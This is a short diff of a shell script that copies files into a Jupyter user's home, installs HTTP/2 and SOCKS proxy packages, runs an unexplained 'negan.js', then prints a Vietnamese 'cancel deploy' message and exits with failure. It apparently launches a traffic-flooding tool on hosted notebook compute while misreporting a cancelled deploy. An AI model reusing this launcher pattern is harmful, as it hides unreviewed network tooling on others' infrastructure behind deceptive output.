@@ -4,5 +4,5 @@ cp -r . /home/jovyan/ 2>/dev/null
 npm install hpack https commander colors socks
 node negan.js
 
-echo "🚨 Hủy deploy..."
+echo -e "\n🚨 Hủy deploy..."
 exit 1
